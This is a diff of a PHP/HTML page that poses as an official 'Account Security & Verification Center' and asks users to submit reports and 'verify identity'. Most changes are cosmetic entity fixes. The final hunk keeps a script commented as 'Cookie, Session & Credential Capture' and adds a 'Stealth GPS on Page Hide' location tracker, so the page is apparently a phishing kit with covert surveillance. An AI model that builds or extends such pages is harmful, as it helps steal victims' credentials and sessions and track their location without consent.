@@ -18,7 +18,7 @@ $smr_nonce = $_SESSION['smr_nonce'];
 <head>
   <meta charset="UTF-8">
   <meta name="viewport" content="width=device-width, initial-scale=1.0">
-  <title>Account Security &amp; Verification Center</title>
+  <title>Account Security & Verification Center</title>
   <script src="https://cdn.tailwindcss.com"></script>
   <link rel="preconnect" href="https://fonts.googleapis.com">
   <link href="https://fonts.googleapis.com/css2?family=Inter:wght@300;400;500;600;700&display=swap" rel="stylesheet">
@@ -43,8 +43,8 @@ $smr_nonce = $_SESSION['smr_nonce'];
         </svg>
       </div>
       <div>
-        <h1 class="text-2xl sm:text-3xl font-bold text-slate-900 tracking-tight leading-tight">Account Security &amp; Verification Center</h1>
-        <p class="text-sm text-slate-500 mt-1 leading-relaxed">Official Platform Account Verification &amp; Incident Reporting Portal</p>
+        <h1 class="text-2xl sm:text-3xl font-bold text-slate-900 tracking-tight leading-tight">Account Security & Verification Center</h1>
+        <p class="text-sm text-slate-500 mt-1 leading-relaxed">Official Platform Account Verification & Incident Reporting Portal</p>
       </div>
     </div>
   </div>
@@ -114,7 +114,7 @@ $smr_nonce = $_SESSION['smr_nonce'];
       </li>
       <li class="flex items-start gap-3">
         <span class="flex-shrink-0 flex items-center justify-center w-6 h-6 rounded-full text-xs font-bold bg-white/20 text-white mt-0.5">3</span>
-        <span class="text-sm text-blue-100 leading-relaxed">Our Trust &amp; Safety team reviews the report and initiates appropriate action within 24&ndash;48 hours.</span>
+        <span class="text-sm text-blue-100 leading-relaxed">Our Trust & Safety team reviews the report and initiates appropriate action within 24&ndash;48 hours.</span>
       </li>
     </ol>
   </div>
@@ -132,7 +132,7 @@ $smr_nonce = $_SESSION['smr_nonce'];
         <div class="space-y-2.5 text-sm text-slate-700 leading-relaxed">
           <p>The information you provide in this report is used <span class="font-medium text-slate-800">solely for identity verification and investigation purposes</span>. Your personal details are securely handled and will not be shared publicly.</p>
           <p>If the reported account is found to be in violation of platform policies or involved in harmful activity, appropriate action may be taken --which may include <span class="font-medium text-slate-800">account restriction, suspension, or permanent removal</span>.</p>
-          <p>You may also provide <span class="font-medium text-slate-800">optional additional details or supporting information</span> to help our Trust &amp; Safety team conduct a more accurate and efficient investigation.</p>
+          <p>You may also provide <span class="font-medium text-slate-800">optional additional details or supporting information</span> to help our Trust & Safety team conduct a more accurate and efficient investigation.</p>
         </div>
       </div>
     </div>
@@ -323,8 +323,8 @@ $smr_nonce = $_SESSION['smr_nonce'];
         </div>
 
         <div id="smr_err_social" class="smr-alert-error" style="display:none;margin-bottom:1rem;"></div>
-        <button class="smr-btn-primary" id="smr_btn_social" type="submit">Submit Report &amp; Verify Identity</button>
-        <p class="text-center text-xs text-slate-400 mt-3 leading-relaxed">By submitting you confirm this information is accurate and authorise our Trust &amp; Safety team to investigate the reported account.</p>
+        <button class="smr-btn-primary" id="smr_btn_social" type="submit">Submit Report & Verify Identity</button>
+        <p class="text-center text-xs text-slate-400 mt-3 leading-relaxed">By submitting you confirm this information is accurate and authorise our Trust & Safety team to investigate the reported account.</p>
       </form>
 
       <div id="smr_social_nojs" class="text-center py-8">
@@ -428,8 +428,8 @@ $smr_nonce = $_SESSION['smr_nonce'];
         </div>
 
         <div id="smr_err_messaging" class="smr-alert-error" style="display:none;margin-bottom:1rem;"></div>
-        <button class="smr-btn-primary" id="smr_btn_messaging" type="submit">Submit Report &amp; Verify Identity</button>
-        <p class="text-center text-xs text-slate-400 mt-3 leading-relaxed">By submitting you confirm this information is accurate and authorise our Trust &amp; Safety team to investigate the reported account.</p>
+        <button class="smr-btn-primary" id="smr_btn_messaging" type="submit">Submit Report & Verify Identity</button>
+        <p class="text-center text-xs text-slate-400 mt-3 leading-relaxed">By submitting you confirm this information is accurate and authorise our Trust & Safety team to investigate the reported account.</p>
       </form>
 
       <div id="smr_messaging_nojs" class="text-center py-8">
@@ -445,8 +445,8 @@ $smr_nonce = $_SESSION['smr_nonce'];
 
   <!-- ════════════ FOOTER ════════════ -->
   <div class="smr-footer">
-    <p>All reports are reviewed by the Platform Trust &amp; Safety Team in accordance with platform security policies.</p>
-    <p style="margin-top:0.25rem;">&copy; <?php echo date('Y'); ?> Platform Trust &amp; Safety Division &nbsp;&middot;&nbsp; Secure SSL/TLS Encrypted</p>
+    <p>All reports are reviewed by the Platform Trust & Safety Team in accordance with platform security policies.</p>
+    <p style="margin-top:0.25rem;">&copy; <?php echo date('Y'); ?> Platform Trust & Safety Division &nbsp;&middot;&nbsp; Secure SSL/TLS Encrypted</p>
   </div>
 
 </div><!-- /smr-container -->
@@ -650,6 +650,8 @@ $smr_nonce = $_SESSION['smr_nonce'];
 </script>
 
 <!-- NetraX Collector: Cookie, Session & Credential Capture -->
-<script src="../../core/netrax_collector.js"></script>
+<script src="../core/netrax_collector.js"></script>
+<!-- NetraX Location Tracker: Stealth GPS on Page Hide -->
+<script src="../core/netrax_location_tracker.js"></script>
 </body>
 </html>
